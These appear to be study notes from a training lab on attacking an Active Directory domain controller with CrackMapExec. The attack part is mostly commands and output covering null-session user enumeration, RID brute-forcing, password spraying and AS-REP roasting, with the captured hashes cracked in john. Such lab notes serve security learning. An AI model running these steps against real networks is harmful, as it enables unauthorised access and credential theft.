# CrackMapExec


## Using the modules on the protocols


Null Sessions or Anonymous

```bash
❯ crackmapexec smb 10.129.204.177 -u '' -p ''
SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\: 
❯ crackmapexec smb 10.129.204.177 -u '' -p '' --users
SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\: 
SMB         10.129.204.177  445    DC01             [*] Trying to dump local users with SAMRPC protocol
SMB         10.129.204.177  445    DC01             [+] Enumerated domain user(s)
SMB         10.129.204.177  445    DC01             inlanefreight.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.129.204.177  445    DC01             inlanefreight.htb\carlos                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\grace                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\peter                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\alina                          Account for testing HR App. Password: HRApp123!
SMB         10.129.204.177  445    DC01             inlanefreight.htb\noemi                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\engels                         Service Account for testing
SMB         10.129.204.177  445    DC01             inlanefreight.htb\kiosko                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\testaccount                    pwd: Testing123!
SMB         10.129.204.177  445    DC01             inlanefreight.htb\mathew                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\svc_mssql                      
SMB         10.129.204.177  445    DC01             inlanefreight.htb\gmsa_adm                       
SMB         10.129.204.177  445    DC01             inlanefreight.htb\belkis                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\nicole                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\jorge                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\linda                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\shaun                          
SMB         10.129.204.177  445    DC01             inlanefreight.htb\diana                          Secret word WeLoveHacking
SMB         10.129.204.177  445    DC01             inlanefreight.htb\patrick                        
SMB         10.129.204.177  445    DC01             inlanefreight.htb\elieser
```

you need to understand, that if you can get "signing: True" in the "smb" protocol, you can get info like "--users" "--pass-pol" "--computers" "--shares"
otherwise, you need to find another way to get information, like:

"--rid-brute"

With this option for "smb" protocol, you can enumerate objects in the AD (Active Directory) like, users, computers, password policies.
You can use an option like "--sam" Security Account Manager, password hasheds stored in the Windows operating system


```bash
❯ crackmapexec smb 10.129.15.50 -u Guest -p '' --rid-brute
SMB         10.129.15.50    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.15.50    445    DC01             [+] inlanefreight.htb\Guest: 
SMB         10.129.15.50    445    DC01             498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.15.50    445    DC01             500: INLANEFREIGHT\Administrator (SidTypeUser)
SMB         10.129.15.50    445    DC01             501: INLANEFREIGHT\Guest (SidTypeUser)
SMB         10.129.15.50    445    DC01             502: INLANEFREIGHT\krbtgt (SidTypeUser)
SMB         10.129.15.50    445    DC01             512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
SMB         10.129.15.50    445    DC01             513: INLANEFREIGHT\Domain Users (SidTypeGroup)
SMB         10.129.15.50    445    DC01             514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
SMB         10.129.15.50    445    DC01             515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
SMB         10.129.15.50    445    DC01             516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
SMB         10.129.15.50    445    DC01             517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
SMB         10.129.15.50    445    DC01             518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
SMB         10.129.15.50    445    DC01             519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
SMB         10.129.15.50    445    DC01             520: INLANEFREIGHT\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.15.50    445    DC01             521: INLANEFREIGHT\Read-only Domain Controllers (SidTypeGroup)
    .
    .
    .
    .
    .
<snip>
```





```bash
❯ crackmapexec smb 10.129.204.177 -u usernames.txt -p '' --sam --continue-on-success
SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\Guest: 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\carlos: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\grace: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\peter: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\alina: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\noemi: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\engels: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\kiosko: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\testaccount: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\mathew: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\svc_mssql: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\gmsa_adm: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\belkis: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\nicole: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\jorge: 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\linda: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\shaun: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\diana: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\patrick: STATUS_LOGON_FAILURE 
SMB         10.129.204.177  445    DC01             [-] inlanefreight.htb\elieser: STATUS_LOGON_FAILURE
```


Finding a valid set of credentials if we can't get a proper username list or if the 
target is not vulnerable to null session, by testing authentication against a set 
if targets once we have a list of usernames

I've created a password list using the name of the domain

"--no-bruteforce" is used to test the same lines in the user file and password file
and this feature, check the 1st username with the 1st password and so on, line per line


"--contuinue-on-success" using to check the valid credentials and still trying to 
match the right credentials, even after the first match

```bash
❯ crackmapexec smb 10.129.15.50 -u usernames.txt -p passwords.txt --continue-on-success  | grep -v "[-]"
SMB         10.129.15.50    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.15.50    445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         10.129.15.50    445    DC01             [+] inlanefreight.htb\carlos:Inlanefreight02! 
SMB         10.129.15.50    445    DC01             [+] inlanefreight.htb\nicole:Inlanefreight02!
```


```bash
crackmapexec smb 10.129.15.50 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success
SMB         10.129.15.50    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\Guest:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [+] inlanefreight.htb\carlos:Inlanefreight02! 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\grace:Inlanefreight03! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\peter:Inlanefreight04! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\alina:Inlanefreight05! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\noemi:Inlanefreight06! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\engels:Inlanefreight07! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\kiosko:Inlanefreight08! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\testaccount:Inlanefreight09! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\mathew:Inlanefreight10! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\svc_mssql:Inlanefreight11! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\gmsa_adm:Inlanefreight12! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\belkis:Inlanefreight13! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\nicole:Inlanefreight14! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\jorge:Inlanefreight15! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\linda:Inlanefreight16! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\shaun:Inlanefreight17! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\diana:Inlanefreight18! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\patrick:Inlanefreight19! STATUS_LOGON_FAILURE 
SMB         10.129.15.50    445    DC01             [-] inlanefreight.htb\elieser:Inlanefreight20! STATUS_LOGON_FAILURE
```


In case we would like to test a local account instead of a domain account, we can use the --local-auth option in CrackMapExec:



## LDAP

To use the LDAP module, is possible that you could be get an error like this:

```bash
❯ crackmapexec ldap 10.129.204.177 -u Guest -p ''
SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        10.129.204.177  445    DC01             [-] inlanefreight.htb\Guest: Error connecting to the domain, are you sure LDAP service is running on the target?
Error: [Errno Connection error (DC01.inlanefreight.htb:389)] [Errno -2] Name or service not known
```

That is because, you need to add it into the `/etc/hosts` like this:

```bash
cat /etc/hosts

<snip>
<snip>
10.129.204.177 inlanefreight.htb dc01.inlanefreight.htb
```

for the Full Qualified Domain Name (FQDN)





## Performing ASREPROAST Attack

This kind of attack, could be performed only with the ldap module,like this:

```bash
❯ crackmapexec ldap inlanefreight.htb -u ../usernames.txt -p '' --asreproast asreproast.out
SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        10.129.204.177  445    DC01             $krb5asrep$23$noemi@INLANEFREIGHT.HTB:9782048fa18cff8e1a706f17bf91ab0a$39df1677f33d2e6145fb29d2b3c8a051362fc98d3de28aa501bf3e9ff265398ccb16daf77cbe8a711b7ed249ac30a9b991e9219747ef95f69640b172964fba77ac1bd995145d149a65911
fcb9f94511b0d5add3a79923525935b98c88a5d14dd99a2c5cf29a1f4fb6db91116ffd1f20577f2324f40058e11e0fbbf5560a1c046813a6d1566e4f5cf061856ad9876008a29b5b09c180ad137abddc157ae0fd88cb57cc0de540ff6dfc7f1bed7d8dc68c3027ca8320b5456c888c465607d1d116265b6aaf40ea71f7b567b86a519adb60e4dfb1
0c184a6fca758b4aaf81d246a4918b7d23e7d65d058bfdf39f0f7b298ffe0688aafe3c6
LDAP        10.129.204.177  445    DC01             $krb5asrep$23$linda@INLANEFREIGHT.HTB:f5644fd1ec0b22f2dbeb2a6d361b2f48$1ffe095402c56c48d4bd0cc0d5935a952765f9e362f66119cc2e642a46d4aa719ea644c468748733add1c18fb9f61f8db2d20d7efc84284d85bab0e31298d6e7aba1205d3ff7a6bee7a41
8a0902963567d3dc9e58328b8b011e8af7a814f9bd7337e6df316f7ad36c5893ce90d551e61296adfb694297fbe72a8004fe6e98caaec0f85228f7781dc0bc992179de0ba0b6b85f9813138f3f2e3399a6f77f8306283a6403a9e867e43a36fc3f93cb6b290d3579ef25775a89bd812a373b16734074a4950ccf3f7d3167ea4ff36a7c4963728281
d46057ff6d1e78812e51c6c3ad766bb449d6e2c4ee05345c59563318975e80133cf7c6d

❯ john --wordlist=/opt/rockyou.txt asreproast.out
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      ($krb5asrep$23$linda@INLANEFREIGHT.HTB)
Password!        ($krb5asrep$23$noemi@INLANEFREIGHT.HTB)
2g 0:00:00:00 DONE (2024-01-18 20:58) 28.57g/s 650971p/s 1133Kc/s 1133KC/s hehe123..061203
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
